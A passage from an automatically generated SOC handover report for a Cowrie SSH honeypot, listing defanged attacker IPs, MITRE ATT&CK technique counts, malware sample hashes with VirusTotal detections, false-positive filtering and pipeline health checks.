| `101.36.106[.]162` | **8** | 2026-05-22 14:48 | 2026-05-22 15:15 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `129.146.181[.]168` | **5** | 2026-05-22 14:47 | 2026-05-22 17:30 | 3m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]159` | **5** | 2026-05-22 16:31 | 2026-05-22 16:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]179` | **3** | 2026-05-22 15:33 | 2026-05-22 15:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]183` | **3** | 2026-05-22 15:33 | 2026-05-22 15:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]52` | **3** | 2026-05-22 15:33 | 2026-05-22 15:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]62` | **3** | 2026-05-22 16:31 | 2026-05-22 16:32 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]68` | **3** | 2026-05-22 15:33 | 2026-05-22 15:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `74.235.122[.]210` | **2** | 2026-05-22 14:51 | 2026-05-22 14:51 | 0m | 0 | `T1592` | 🟢 LOW |
| `102.88.137[.]145` | 1 | 2026-05-22 15:14 | 2026-05-22 15:15 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.26.136[.]173` | 1 | 2026-05-22 15:26 | 2026-05-22 15:26 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.53.97[.]124` | 1 | 2026-05-22 16:03 | 2026-05-22 16:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.255.76[.]206` | 1 | 2026-05-22 17:27 | 2026-05-22 17:28 | 13s | 0 | `T1592` | 🟢 LOW |
| `120.48.112[.]118` | 1 | 2026-05-22 15:23 | 2026-05-22 15:23 | 27s | 0 | `T1592` | 🟢 LOW |
| `180.76.184[.]79` | 1 | 2026-05-22 17:08 | 2026-05-22 17:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.38.149[.]131` | 1 | 2026-05-22 16:43 | 2026-05-22 16:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `186.146.235[.]58` | 1 | 2026-05-22 17:10 | 2026-05-22 17:10 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `219.150.93[.]157` | 1 | 2026-05-22 17:27 | 2026-05-22 17:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.184.248[.]187` | 1 | 2026-05-22 17:32 | 2026-05-22 17:32 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `66.132.186[.]183` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `186.146.235[.]58` | CO | Telmex Colombia S.A. | **100** ⚠️ | 17 |
| `129.146.181[.]168` | US | Oracle Corporation | **100** ⚠️ | 7 |
| `186.103.169[.]12` | CL | TELEFONICA EMPRESAS CHILE SA | **100** ⚠️ | 50 |
| `106.53.97[.]124` | CN | Tencent cloud computing (Beijing) Co., Ltd. | **100** ⚠️ | 8 |
| `101.126.147[.]62` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 31 |
| `66.132.195[.]52` | US | Censys, Inc. | **100** ⚠️ | 50 |
| `66.132.195[.]68` | US | Censys, Inc. | **100** ⚠️ | 42 |
| `102.88.137[.]145` | NG | MTN Nigeria | **100** ⚠️ | 50 |
| `66.132.186[.]159` | US | Censys, Inc. | **100** ⚠️ | 36 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 170 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 91 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 79 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 39 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 39 |

---

## 🔕 False Positive Summary (119 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 70 |
| AbuseIPDB score 14 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 47 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 317 cases |
| Tool 34  | Credential Extractor        | ✅ 168 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 37 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 119 filtered (37.5%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 27 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 79 priority case(s) shown individually · 24 recon entry/entries in table (14 group(s) consolidating 109 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-22T17:56:40Z_
